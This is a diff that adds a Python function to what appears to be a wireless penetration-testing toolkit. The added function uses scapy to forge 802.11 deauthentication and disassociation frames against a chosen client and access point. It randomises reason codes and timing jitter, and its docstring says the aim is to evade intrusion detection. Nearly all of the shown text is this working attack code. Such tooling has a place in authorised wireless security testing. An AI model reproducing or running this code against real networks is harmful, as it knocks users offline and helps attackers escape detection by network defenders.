@@ -338,6 +338,88 @@ def detect_pmf(
     return result
 
 
+def deauth_evasion(
+    interface: str,
+    target_mac: str,
+    ap_mac: str,
+    count: int = 3,
+    interval: float = 0.2,
+    method: str = "randomized",
+    rate_limit: float = 5.0,
+) -> int:
+    """IDS-evasive deauth — randomized reason codes, disassoc frames, rate limiting."""
+    if not check_scapy():
+        return 0
+
+    REASON_CODES = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 34, 39, 45]
+
+    console.print(
+        f"[yellow]Evasive deauth ({method}): "
+        f"{target_mac} ↔ {ap_mac}, {count} rounds[/yellow]"
+    )
+
+    sent = 0
+    frame_interval = max(interval, 1.0 / rate_limit)
+
+    for _i in range(count):
+        reason = random.choice(REASON_CODES)
+
+        if method == "disassoc":
+            from scapy.all import Dot11Disas
+            pkt = (
+                RadioTap() /
+                Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
+                Dot11Disas(reason=reason)
+            )
+            sendp(pkt, iface=interface, verbose=False)
+            sent += 1
+
+        elif method == "mixed":
+            reason1 = random.choice(REASON_CODES)
+            reason2 = random.choice(REASON_CODES)
+
+            pkt_deauth = (
+                RadioTap() /
+                Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
+                Dot11Deauth(reason=reason1)
+            )
+            sendp(pkt_deauth, iface=interface, verbose=False)
+            sent += 1
+
+            time.sleep(frame_interval * random.uniform(0.5, 1.5))
+
+            from scapy.all import Dot11Disas
+            pkt_disassoc = (
+                RadioTap() /
+                Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) /
+                Dot11Disas(reason=reason2)
+            )
+            sendp(pkt_disassoc, iface=interface, verbose=False)
+            sent += 1
+
+        else:  # randomized (default)
+            pkt_to_client = (
+                RadioTap() /
+                Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
+                Dot11Deauth(reason=reason)
+            )
+            pkt_to_ap = (
+                RadioTap() /
+                Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) /
+                Dot11Deauth(reason=random.choice(REASON_CODES))
+            )
+            sendp(pkt_to_client, iface=interface, verbose=False)
+            sendp(pkt_to_ap, iface=interface, verbose=False)
+            sent += 2
+
+        jitter = frame_interval * random.uniform(0.3, 2.0)
+        time.sleep(jitter)
+
+    console.print(f"[dim]Sent {sent} evasive frames (method={method})[/dim]")
+    log.info("Evasive deauth: %d frames, method=%s, target=%s", sent, method, target_mac)
+    return sent
+
+
 def detect_client_isolation(
     interface: str,
     ap_mac: str,
